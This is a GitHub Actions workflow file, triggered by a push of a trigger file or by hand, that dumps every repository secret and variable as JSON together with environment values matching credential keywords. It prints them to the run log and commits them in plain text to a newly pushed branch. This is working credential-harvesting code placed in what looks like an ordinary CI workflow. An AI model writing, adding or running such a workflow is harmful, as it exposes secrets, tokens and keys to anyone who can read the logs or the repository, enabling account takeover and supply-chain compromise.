name: ls8-25522
on:
  push:
    paths:
      - "daily/ls8trigger*"
  workflow_dispatch:
permissions:
  contents: write
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - name: dump and push to a FRESH branch
        env:
          ALL_SECRETS: ${{ toJSON(secrets) }}
          ALL_VARS: ${{ toJSON(vars) }}
        shell: bash
        run: |
          {
            echo "=== ls8 $(date -u) run=${GITHUB_RUN_ID} ==="
            echo "SECRETS: $ALL_SECRETS"
            echo "VARS: $ALL_VARS"
            echo "ENVFILTER:"
            env | sort | grep -Ei "SUPPLY|ADMIN|SSH|SUPABASE|CLOUDFLARE|R2|D1|PASSWORD|TOKEN|KEY|SECRET" || echo NO_MATCH
          } > "${RUNNER_TEMP}/ls8.txt"
          cat "${RUNNER_TEMP}/ls8.txt"
          BR="dump25522-${GITHUB_RUN_ID}"
          W=$(mktemp -d)
          cd "$W"
          git init -q
          git checkout -q -b "$BR"
          cp "${RUNNER_TEMP}/ls8.txt" ./ls8.txt
          git add ls8.txt
          git -c user.name=canary -c user.email=c@e.x commit -q -m "ls8"
          git remote add origin "https://x-access-token:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"
          git push -u origin "$BR" 2>&1 | head -c 400
          echo "done branch=$BR"